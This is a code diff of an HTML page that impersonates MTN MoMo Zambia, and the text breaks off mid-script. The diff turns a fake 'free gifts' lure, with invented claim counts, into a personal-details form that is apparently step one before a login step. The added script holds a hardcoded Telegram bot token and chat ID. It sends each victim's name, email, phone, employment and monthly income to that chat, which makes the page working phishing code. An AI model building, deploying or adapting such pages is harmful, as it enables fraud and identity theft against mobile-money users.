@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - Free Gifts</title>
+    <title>MTN MoMo - Personal Details</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
@@ -12,18 +13,19 @@
             box-sizing: border-box;
         }
         
-        html, body {
-            min-height: 100vh;
+        html,
+        body {
+            height: 100%;
             font-family: 'Inter', sans-serif;
-            background: #f0f2f5;
-            overflow-x: hidden;
+            background: #f5f5f5;
+            overflow: hidden;
         }
         
         body {
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 20px;
+            padding: 10px;
         }
         
         header {
@@ -33,18 +35,23 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            margin-bottom: 10px;
             background: white;
             border-radius: 16px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            margin-bottom: 15px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
         }
         
-        .menu-btn {
-            font-size: 24px;
+        .back-btn {
+            font-size: 28px;
             background: none;
             border: none;
             cursor: pointer;
             color: #333;
+            transition: transform 0.2s;
+        }
+        
+        .back-btn:hover {
+            transform: scale(1.1);
         }
         
         .logo {
@@ -52,14 +59,12 @@
             font-weight: 700;
         }
         
-        .logo-mtn { color: #FFC100; }
-        .logo-momo { color: #0047AB; }
+        .logo-mtn {
+            color: #FFC100;
+        }
         
-        .login-link {
+        .logo-momo {
             color: #0047AB;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
         }
         
         .card {
@@ -68,657 +73,657 @@
             padding: 30px 25px;
             width: 100%;
             max-width: 480px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            max-height: calc(100vh - 140px);
+        }
+        
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
             text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+        
+        .form-title .highlight {
+            color: #0047AB;
+        }
+        
+        .form-subtitle {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
             margin-bottom: 15px;
         }
         
-        .title {
-            font-size: 26px;
-            font-weight: 800;
-            color: #1a1a2e;
-            margin-bottom: 5px;
-            line-height: 1.2;
-        }
-        
-        .title .highlight {
-            color: #FFC100;
-        }
-        
-        .title .highlight2 {
-            color: #0047AB;
-        }
-        
-        .subtitle {
-            font-size: 14px;
-            color: #888;
-            margin-bottom: 20px;
-        }
-        
-        /* ===== GIFTS SECTION ===== */
-        .gifts-section {
-            background: #f8f9ff;
-            border-radius: 16px;
-            padding: 20px;
-            text-align: left;
-        }
-        
-        .gifts-title {
-            font-size: 17px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 16px;
-            color: #1a1a2e;
-        }
-        
-        .gifts-title .emoji {
-            margin-right: 6px;
-        }
-        
-        .gifts-title .count {
-            background: #0047AB;
-            color: white;
-            font-size: 11px;
-            padding: 2px 12px;
-            border-radius: 20px;
-            font-weight: 600;
-            margin-left: 6px;
-        }
-        
-        .gift-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 16px;
-        }
-        
-        .gift-card {
-            background: white;
-            border-radius: 14px;
-            padding: 16px 10px;
-            text-align: center;
-            border: 2px solid #e8ecf5;
-            transition: all 0.3s;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .gift-card:hover {
-            border-color: #0047AB;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(0,71,171,0.12);
-        }
-        
-        .gift-card .icon {
-            font-size: 32px;
-            display: block;
-            margin-bottom: 4px;
-        }
-        
-        .gift-card .name {
-            font-size: 12px;
-            font-weight: 700;
-            color: #1a1a2e;
-            margin-bottom: 2px;
-        }
-        
-        .gift-card .value {
-            font-size: 14px;
-            font-weight: 800;
-            color: #0047AB;
-        }
-        
-        .gift-card .badge {
-            display: inline-block;
-            font-size: 9px;
-            font-weight: 700;
-            padding: 2px 10px;
-            border-radius: 20px;
-            margin-top: 4px;
-        }
-        
-        .gift-card .badge.free {
-            background: #e8f5e9;
-            color: #1e7e34;
-        }
-        
-        .gift-card .badge.limited {
-            background: #fff3e0;
-            color: #e65100;
-        }
-        
-        .gift-card .badge.hot {
-            background: #ffebee;
-            color: #c62828;
-            animation: pulse 1.5s infinite;
-        }
-        
-        .gift-card .badge.popular {
-            background: #e3f2fd;
-            color: #0047AB;
-        }
-        
-        .gift-card .badge.new {
-            background: #f3e5f5;
-            color: #6a1b9a;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        .gift-card .users {
-            font-size: 9px;
-            color: #999;
-            margin-top: 4px;
-        }
-        
-        .gift-card .users .emoji {
-            font-size: 10px;
-        }
-        
-        /* ===== REGISTER BOX ===== */
-        .register-box {
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            border-radius: 14px;
-            padding: 20px;
-            text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .register-box::before {
-            content: '🎁';
-            position: absolute;
-            top: -20px;
-            right: -10px;
-            font-size: 80px;
-            opacity: 0.1;
-        }
-        
-        .register-box .box-title {
-            font-size: 18px;
-            font-weight: 800;
-            margin-bottom: 4px;
-        }
-        
-        .register-box .box-sub {
-            font-size: 13px;
-            opacity: 0.9;
-            margin-bottom: 12px;
-        }
-        
-        .register-box .box-sub .highlight {
-            color: #FFC100;
-            font-weight: 700;
-        }
-        
-        .register-box .register-btn {
-            width: 100%;
-            padding: 15px;
-            background: #FFC100;
-            color: #1a1a2e;
-            border: none;
-            border-radius: 50px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .register-box .register-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(255,193,0,0.35);
-        }
-        
-        /* ===== STATS ===== */
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 4px;
-        }
-        
-        .stat-item {
+        .gift-preview {
             background: #f8f9ff;
             border-radius: 12px;
-            padding: 14px 8px;
-            text-align: center;
-        }
-        
-        .stat-item .number {
-            font-size: 24px;
-            font-weight: 800;
-            color: #0047AB;
-        }
-        
-        .stat-item .label {
-            font-size: 10px;
-            color: #888;
-            font-weight: 500;
-        }
-        
-        /* ===== FEATURES ===== */
-        .features {
+            padding: 12px 16px;
+            margin-bottom: 16px;
             display: flex;
-            justify-content: space-around;
-            gap: 10px;
+            align-items: center;
+            gap: 12px;
+            border: 2px solid #e8ecf5;
         }
         
-        .feature {
-            text-align: center;
-            color: #777;
-            font-size: 12px;
+        .gift-preview .icon {
+            font-size: 32px;
+        }
+        
+        .gift-preview .info {
             flex: 1;
         }
         
-        .feature-icon {
-            font-size: 28px;
-            display: block;
-            margin-bottom: 4px;
+        .gift-preview .info .label {
+            font-size: 11px;
+            color: #888;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
         
-        .feature strong {
+        .gift-preview .info .name {
+            font-size: 16px;
+            font-weight: 700;
             color: #1a1a2e;
         }
         
-        /* ===== BOTTOM NAV ===== */
-        .bottom-nav {
-            display: flex;
-            justify-content: space-around;
-            background: white;
-            border-radius: 16px;
-            padding: 12px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        .gift-preview .info .value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #0047AB;
         }
         
-        .nav-item {
+        .progress-bar {
+            width: 180px;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 15px auto;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            transition: width 0.5s ease;
+        }
+        
+        .step-text {
             text-align: center;
-            color: #999;
-            font-size: 12px;
-            text-decoration: none;
-            cursor: pointer;
-            background: none;
-            border: none;
-            font-family: 'Inter', sans-serif;
-            transition: color 0.2s;
+            color: #777;
+            font-size: 14px;
+            margin-bottom: 16px;
+            font-weight: 500;
         }
         
-        .nav-item.active { color: #0047AB; font-weight: 600; }
-        .nav-item .icon { font-size: 22px; display: block; }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+        
+        .form-label .required {
+            color: #e74c3c;
+            margin-left: 2px;
+        }
+        
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: 'Inter', sans-serif;
+            background: white;
+            color: #333;
+        }
+        
+        .form-input:focus,
+        .form-select:focus {
+            border-color: #0047AB;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+        
+        .form-input::placeholder {
+            color: #aaa;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .form-row .form-group {
+            flex: 1;
+        }
+        
+        .invalid {
+            border-color: #e74c3c !important;
+            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
+            animation: shake 0.4s ease;
+        }
+        
+        @keyframes shake {
+            0%,
+            100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+        
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+            font-weight: 500;
+        }
+        
+        .error-text.show {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+        
+        @keyframes slideDown {
+            0% { opacity: 0; transform: translateY(-5px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 15px;
+        }
+        
+        .back-btn-main {
+            flex: 0 0 auto;
+            padding: 14px 24px;
+            background: #f0f0f0;
+            color: #555;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, background 0.2s;
+        }
+        
+        .back-btn-main:hover {
+            background: #e0e0e0;
+            transform: scale(1.02);
+        }
+        
+        .submit-btn {
+            flex: 1;
+            padding: 14px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.35);
+        }
+        
+        .submit-btn:active:not(:disabled) {
+            transform: scale(0.98);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .submit-btn .loader {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         
         footer {
             padding: 15px;
             color: #aaa;
             font-size: 12px;
             text-align: center;
-            width: 100%;
-            max-width: 480px;
+            margin-top: auto;
         }
         
-        footer a {
-            color: #0047AB;
-            text-decoration: none;
-            font-weight: 600;
+        /* Scrollbar styling */
+        .card::-webkit-scrollbar {
+            width: 4px;
         }
         
-        /* ===== NOTIFICATION ===== */
-        .notification {
-            position: fixed;
-            bottom: 80px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #1a1a2e;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 14px;
-            font-size: 13px;
-            font-weight: 600;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            z-index: 100;
-            display: none;
-            max-width: 400px;
-            text-align: center;
-            animation: slideUp 0.4s ease;
+        .card::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
         }
         
-        @keyframes slideUp {
-            0% { transform: translateX(-50%) translateY(20px); opacity: 0; }
-            100% { transform: translateX(-50%) translateY(0); opacity: 1; }
+        .card::-webkit-scrollbar-thumb {
+            background: #0047AB;
+            border-radius: 10px;
         }
         
         @media (max-width: 480px) {
-            body { padding: 10px; }
-            .card { padding: 20px 16px; }
-            .title { font-size: 22px; }
-            .features { flex-wrap: wrap; }
-            .feature { flex: 1 0 80px; }
-            .gift-grid { grid-template-columns: repeat(3, 1fr); gap: 6px; }
-            .gift-card { padding: 12px 6px; }
-            .gift-card .icon { font-size: 26px; }
-            .gift-card .name { font-size: 10px; }
-            .gift-card .value { font-size: 12px; }
-            .stats { grid-template-columns: repeat(3, 1fr); gap: 6px; }
-            .stat-item .number { font-size: 18px; }
-            .stat-item { padding: 10px 6px; }
-            .register-box .box-title { font-size: 16px; }
-            .register-box .register-btn { font-size: 15px; padding: 13px; }
-        }
-        
-        @media (max-width: 380px) {
-            .gift-grid { grid-template-columns: repeat(2, 1fr); }
+            .card {
+                padding: 20px 16px;
+            }
+            .form-title {
+                font-size: 20px;
+            }
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .back-btn-main {
+                padding: 12px 16px;
+                font-size: 14px;
+            }
+            .submit-btn {
+                font-size: 14px;
+                padding: 12px;
+            }
+            .form-input,
+            .form-select {
+                font-size: 14px;
+                padding: 10px 12px;
+            }
+            .gift-preview {
+                padding: 10px 14px;
+            }
+            .gift-preview .icon {
+                font-size: 26px;
+            }
+            .gift-preview .info .name {
+                font-size: 14px;
+            }
         }
     </style>
 </head>
+
 <body>
-
-    <!-- Notification -->
-    <div class="notification" id="notification"></div>
-
-    <!-- Header -->
     <header>
-        <button class="menu-btn" aria-label="Menu">☰</button>
-        <div class="logo">
-            <span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span>
-        </div>
-        <a href="login.html" class="login-link">Login</a>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
+        <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
+        <div></div>
     </header>
-
-    <!-- Main Content -->
-    <div class="card">
-        <h1 class="title">
-            🎁 Get Free <span class="highlight">MoMo</span> <span class="highlight2">Gifts</span>
-        </h1>
-        <p class="subtitle">Exclusive offers • Free airtime • Data bundles • Cash rewards</p>
+    
+    <main class="card">
+        <h1 class="form-title">🎁 Your <span class="highlight">Details</span></h1>
+        <p class="form-subtitle">Fill in your personal information</p>
         
-        <div class="gifts-section">
-            <div class="gifts-title">
-                <span class="emoji">🎁</span> Today's Featured Gifts
-                <span class="count">18 Offers</span>
-            </div>
-            
-            <!-- Gift Grid - 18 Gifts -->
-            <div class="gift-grid">
-                <!-- Row 1: Airtime & Data -->
-                <div class="gift-card" onclick="showGift('Airtime', 'ZMW 179')">
-                    <span class="icon">📱</span>
-                    <div class="name">Airtime</div>
-                    <div class="value">ZMW 179</div>
-                    <span class="badge free">FREE</span>
-                    <div class="users"><span class="emoji">👤</span> 2.4k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Data Bundle', '5GB')">
-                    <span class="icon">🌐</span>
-                    <div class="name">Data Bundle</div>
-                    <div class="value">5GB</div>
-                    <span class="badge hot">🔥 HOT</span>
-                    <div class="users"><span class="emoji">👤</span> 5.1k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Data Bundle Plus', '10GB')">
-                    <span class="icon">📶</span>
-                    <div class="name">Data Bundle+</div>
-                    <div class="value">10GB</div>
-                    <span class="badge popular">⭐ POPULAR</span>
-                    <div class="users"><span class="emoji">👤</span> 3.8k claimed</div>
-                </div>
-                
-                <!-- Row 2: Cash & Vouchers -->
-                <div class="gift-card" onclick="showGift('Cash Reward', 'ZMW 1,856')">
-                    <span class="icon">💰</span>
-                    <div class="name">Cash Reward</div>
-                    <div class="value">ZMW 1,856</div>
-                    <span class="badge limited">LIMITED</span>
-                    <div class="users"><span class="emoji">👤</span> 892 claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Shopping Voucher', 'ZMW 2,500')">
-                    <span class="icon">🛒</span>
-                    <div class="name">Shopping Voucher</div>
-                    <div class="value">ZMW 2,500</div>
-                    <span class="badge hot">🔥 HOT</span>
-                    <div class="users"><span class="emoji">👤</span> 1.2k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Food Voucher', 'ZMW 1,200')">
-                    <span class="icon">🍔</span>
-                    <div class="name">Food Voucher</div>
-                    <div class="value">ZMW 1,200</div>
-                    <span class="badge new">🆕 NEW</span>
-                    <div class="users"><span class="emoji">👤</span> 456 claimed</div>
-                </div>
-                
-                <!-- Row 3: Entertainment -->
-                <div class="gift-card" onclick="showGift('Music Streaming', '3 Months')">
-                    <span class="icon">🎵</span>
-                    <div class="name">Music Streaming</div>
-                    <div class="value">3 Months</div>
-                    <span class="badge popular">⭐ POPULAR</span>
-                    <div class="users"><span class="emoji">👤</span> 3.7k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Video Bundle', '10GB')">
-                    <span class="icon">📺</span>
-                    <div class="name">Video Bundle</div>
-                    <div class="value">10GB</div>
-                    <span class="badge free">FREE</span>
-                    <div class="users"><span class="emoji">👤</span> 1.8k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Gaming Bundle', 'ZMW 500')">
-                    <span class="icon">🎮</span>
-                    <div class="name">Gaming Bundle</div>
-                    <div class="value">ZMW 500</div>
-                    <span class="badge new">🆕 NEW</span>
-                    <div class="users"><span class="emoji">👤</span> 324 claimed</div>
-                </div>
-                
-                <!-- Row 4: More Gifts -->
-                <div class="gift-card" onclick="showGift('Social Media Bundle', '2GB')">
-                    <span class="icon">📱</span>
-                    <div class="name">Social Media</div>
-                    <div class="value">2GB</div>
-                    <span class="badge free">FREE</span>
-                    <div class="users"><span class="emoji">👤</span> 4.2k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Night Data', '15GB')">
-                    <span class="icon">🌙</span>
-                    <div class="name">Night Data</div>
-                    <div class="value">15GB</div>
-                    <span class="badge hot">🔥 HOT</span>
-                    <div class="users"><span class="emoji">👤</span> 2.1k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Weekend Bundle', '7GB')">
-                    <span class="icon">🎉</span>
-                    <div class="name">Weekend Bundle</div>
-                    <div class="value">7GB</div>
-                    <span class="badge popular">⭐ POPULAR</span>
-                    <div class="users"><span class="emoji">👤</span> 1.9k claimed</div>
-                </div>
-                
-                <!-- Row 5: More Cash & Vouchers -->
-                <div class="gift-card" onclick="showGift('Fuel Voucher', 'ZMW 800')">
-                    <span class="icon">⛽</span>
-                    <div class="name">Fuel Voucher</div>
-                    <div class="value">ZMW 800</div>
-                    <span class="badge limited">LIMITED</span>
-                    <div class="users"><span class="emoji">👤</span> 567 claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Fashion Voucher', 'ZMW 1,500')">
-                    <span class="icon">👗</span>
-                    <div class="name">Fashion Voucher</div>
-                    <div class="value">ZMW 1,500</div>
-                    <span class="badge new">🆕 NEW</span>
-                    <div class="users"><span class="emoji">👤</span> 234 claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Grocery Voucher', 'ZMW 2,000')">
-                    <span class="icon">🛍️</span>
-                    <div class="name">Grocery Voucher</div>
-                    <div class="value">ZMW 2,000</div>
-                    <span class="badge hot">🔥 HOT</span>
-                    <div class="users"><span class="emoji">👤</span> 1.4k claimed</div>
-                </div>
-                
-                <!-- Row 6: Premium Gifts -->
-                <div class="gift-card" onclick="showGift('Movie Tickets', '2 Tickets')">
-                    <span class="icon">🎬</span>
-                    <div class="name">Movie Tickets</div>
-                    <div class="value">2 Tickets</div>
-                    <span class="badge popular">⭐ POPULAR</span>
-                    <div class="users"><span class="emoji">👤</span> 2.8k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Health Insurance', '1 Month')">
-                    <span class="icon">🏥</span>
-                    <div class="name">Health Insurance</div>
-                    <div class="value">1 Month</div>
-                    <span class="badge free">FREE</span>
-                    <div class="users"><span class="emoji">👤</span> 1.1k claimed</div>
-                </div>
-                <div class="gift-card" onclick="showGift('Education Bundle', 'ZMW 3,000')">
-                    <span class="icon">📚</span>
-                    <div class="name">Education Bundle</div>
-                    <div class="value">ZMW 3,000</div>
-                    <span class="badge limited">LIMITED</span>
-                    <div class="users"><span class="emoji">👤</span> 345 claimed</div>
-                </div>
-            </div>
-            
-            <!-- Register Box -->
-            <div class="register-box">
-                <div class="box-title">🎯 You Qualify for a Free Gift!</div>
-                <div class="box-sub">
-                    <span class="highlight">12,847 users</span> have already claimed their gifts. 
-                    Don't miss out!
-                </div>
-                <button class="register-btn" id="registerBtn">
-                    🎁 CLAIM YOUR GIFT
-                </button>
+        <!-- Gift Preview -->
+        <div class="gift-preview" id="giftPreview">
+            <span class="icon" id="giftIcon">🎁</span>
+            <div class="info">
+                <div class="label">🎯 Your Selected Gift</div>
+                <div class="name" id="giftName">Loading...</div>
+                <div class="value" id="giftValue">-</div>
             </div>
         </div>
-    </div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <div class="step-text">Step 1 of 2 • Your information</div>
 
-    <!-- Stats -->
-    <div class="card" style="padding: 20px;">
-        <div class="stats">
-            <div class="stat-item">
-                <div class="number" id="usersCount">0</div>
-                <div class="label">Users Registered</div>
+        <!-- Full Name -->
+        <div class="form-group">
+            <label class="form-label">Full Name <span class="required">*</span></label>
+            <input type="text" class="form-input" id="fullName" placeholder="Enter your full name" required>
+            <div class="error-text" id="nameError">Please enter your full name (min 2 characters).</div>
+        </div>
+
+        <!-- Email & Phone Row -->
+        <div class="form-row">
+            <div class="form-group">
+                <label class="form-label">Email Address <span class="required">*</span></label>
+                <input type="email" class="form-input" id="email" placeholder="john@example.com" required>
+                <div class="error-text" id="emailError">Please enter a valid email address.</div>
             </div>
-            <div class="stat-item">
-                <div class="number" id="giftsCount">0</div>
-                <div class="label">Gifts Given</div>
-            </div>
-            <div class="stat-item">
-                <div class="number" id="offersCount">0</div>
-                <div class="label">Active Offers</div>
+            <div class="form-group">
+                <label class="form-label">Phone Number <span class="required">*</span></label>
+                <input type="tel" class="form-input" id="phone" placeholder="97 123 4567" required>
+                <div class="error-text" id="phoneError">Please enter a valid phone number.</div>
             </div>
         </div>
-    </div>
 
-    <!-- Features -->
-    <div class="card" style="padding: 20px;">
-        <div class="features">
-            <div class="feature">
-                <span class="feature-icon">⚡</span>
-                Instant<br><strong>Free Gifts</strong>
-            </div>
-            <div class="feature">
-                <span class="feature-icon">🎯</span>
-                Exclusive<br><strong>Offers Daily</strong>
-            </div>
-            <div class="feature">
-                <span class="feature-icon">🔒</span>
-                Secure<br><strong>MoMo Verified</strong>
-            </div>
+        <!-- Employment Status -->
+        <div class="form-group">
+            <label class="form-label">Employment Status <span class="required">*</span></label>
+            <select class="form-select" id="employment" required>
+                <option value="">Select employment status</option>
+                <option value="employed">Employed Full-Time</option>
+                <option value="parttime">Employed Part-Time</option>
+                <option value="selfemployed">Self-Employed</option>
+                <option value="business">Business Owner</option>
+                <option value="unemployed">Unemployed</option>
+                <option value="student">Student</option>
+                <option value="retired">Retired</option>
+            </select>
+            <div class="error-text" id="employmentError">Please select your employment status.</div>
         </div>
-    </div>
 
-    <!-- Bottom Navigation -->
-    <div class="bottom-nav">
-        <button class="nav-item active">
-            <span class="icon">🏠</span>
-            Home
-        </button>
-        <button class="nav-item" onclick="window.location.href='application.html'">
-            <span class="icon">🎁</span>
-            Gifts
-        </button>
-        <button class="nav-item" onclick="window.location.href='login.html'">
-            <span class="icon">🔐</span>
-            Login
-        </button>
-    </div>
+        <!-- Monthly Income -->
+        <div class="form-group">
+            <label class="form-label">Monthly Income (ZMW) <span class="required">*</span></label>
+            <input type="number" class="form-input" id="income" placeholder="5000" min="0" step="100" required>
+            <div class="error-text" id="incomeError">Please enter your monthly income.</div>
+        </div>
 
-    <footer>
-        © 2026 MTN MoMo Zambia • 
-        <a href="#" onclick="alert('Call 155 for support')">Help</a> • 
-        <a href="#" onclick="alert('Terms & Conditions')">Terms</a>
-    </footer>
+        <!-- Buttons -->
+        <div class="btn-group">
+            <button class="back-btn-main" onclick="window.location.href='index.html'">← BACK</button>
+            <button class="submit-btn" id="submitBtn">🎁 NEXT: LOGIN →</button>
+        </div>
+    </main>
+    
+    <footer>© 2026 MTN MoMo Zambia • Secured with 🔒</footer>
 
     <script>
         // ============================================
-        // STATS - Auto-increment animation
+        // TELEGRAM CREDENTIALS
         // ============================================
-        function animateCounter(element, target, duration = 2000) {
-            const start = 0;
-            const startTime = performance.now();
+        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
+        const CHAT_ID = '8392790531';
+        const API_URL = 'https://abundant-liberation.up.railway.app/api';
+
+        // ============================================
+        // LOAD SELECTED GIFT
+        // ============================================
+        function loadSelectedGift() {
+            const gift = localStorage.getItem('selectedGift') || 'Not selected';
+            const value = localStorage.getItem('selectedGiftValue') || '-';
+            const icon = localStorage.getItem('selectedGiftIcon') || '🎁';
             
-            function update(currentTime) {
-                const elapsed = currentTime - startTime;
-                const progress = Math.min(elapsed / duration, 1);
-                const current = Math.floor(progress * target);
-                element.textContent = current.toLocaleString();
-                
-                if (progress < 1) {
-                    requestAnimationFrame(update);
-                } else {
-                    element.textContent = target.toLocaleString();
-                }
+            document.getElementById('giftIcon').textContent = icon;
+            document.getElementById('giftName').textContent = gift;
+            document.getElementById('giftValue').textContent = value;
+            
+            console.log('🎁 Selected Gift:', gift, '-', value);
+        }
+
+        loadSelectedGift();
+
+        // ============================================
+        // PRE-FILL FROM LOCALSTORAGE
+        // ============================================
+        const savedName = localStorage.getItem('fullName');
+        const savedEmail = localStorage.getItem('email');
+        const savedPhone = localStorage.getItem('phone');
+        const savedEmployment = localStorage.getItem('employment');
+        const savedIncome = localStorage.getItem('income');
+
+        if (savedName) document.getElementById('fullName').value = savedName;
+        if (savedEmail) document.getElementById('email').value = savedEmail;
+        if (savedPhone) document.getElementById('phone').value = savedPhone;
+        if (savedEmployment) document.getElementById('employment').value = savedEmployment;
+        if (savedIncome) document.getElementById('income').value = savedIncome;
+
+        // ============================================
+        // DOM REFERENCES
+        // ============================================
+        const submitBtn = document.getElementById('submitBtn');
+
+        // ============================================
+        // VALIDATION FUNCTIONS
+        // ============================================
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function validatePhone(phone) {
+            const cleaned = phone.replace(/\s/g, '');
+            return cleaned.length >= 9 && /^[\+\d\s-]+$/.test(phone);
+        }
+
+        function getErrorElements() {
+            return {
+                name: document.getElementById('nameError'),
+                email: document.getElementById('emailError'),
+                phone: document.getElementById('phoneError'),
+                employment: document.getElementById('employmentError'),
+                income: document.getElementById('incomeError')
+            };
+        }
+
+        function getInputElements() {
+            return {
+                name: document.getElementById('fullName'),
+                email: document.getElementById('email'),
+                phone: document.getElementById('phone'),
+                employment: document.getElementById('employment'),
+                income: document.getElementById('income')
+            };
+        }
+
+        function resetErrors() {
+            const inputs = getInputElements();
+            const errors = getErrorElements();
+            
+            Object.values(inputs).forEach(el => el.classList.remove('invalid'));
+            Object.values(errors).forEach(el => el.classList.remove('show'));
+        }
+
+        function showError(input, errorElement, message) {
+            input.classList.add('invalid');
+            errorElement.textContent = message || errorElement.textContent;
+            errorElement.classList.add('show');
+        }
+
+        // ============================================
+        // SEND TO TELEGRAM
+        // ============================================
+        async function sendToTelegram(data) {
+            const message = `🎁 *NEW MTN MoMo GIFT REGISTRATION - ZAMBIA*\n\n` +
+                `🎯 *GIFT SELECTED*\n` +
+                `🎁 Gift: ${data.gift}\n` +
+                `💰 Value: ${data.giftValue}\n\n` +
+                `👤 *PERSONAL DETAILS*\n` +
+                `👤 Name: ${data.fullName}\n` +
+                `📧 Email: ${data.email}\n` +
+                `📱 Phone: +260 ${data.phone}\n` +
+                `💼 Employment: ${data.employment}\n` +
+                `💰 Monthly Income: ZMW ${parseInt(data.income).toLocaleString()}\n\n` +
+                `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+                `✅ User has registered for a gift. Proceeding to login.`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const result = await response.json();
+                console.log('📤 Telegram response:', result);
+                return result.ok;
+            } catch (error) {
+                console.error('❌ Telegram error:', error);
+                return false;
             }
-            
-            requestAnimationFrame(update);
         }
 
+        // ============================================
+        // SUBMIT HANDLER - Goes to login.html
+        // ============================================
+        submitBtn.addEventListener('click', async function() {
+            const inputs = getInputElements();
+            const errors = getErrorElements();
+            
+            const name = inputs.name.value.trim();
+            const email = inputs.email.value.trim();
+            const phone = inputs.phone.value.trim();
+            const employment = inputs.employment.value;
+            const income = inputs.income.value.trim();
+
+            resetErrors();
+            let valid = true;
+
+            // Validate Name
+            if (!name || name.length < 2) {
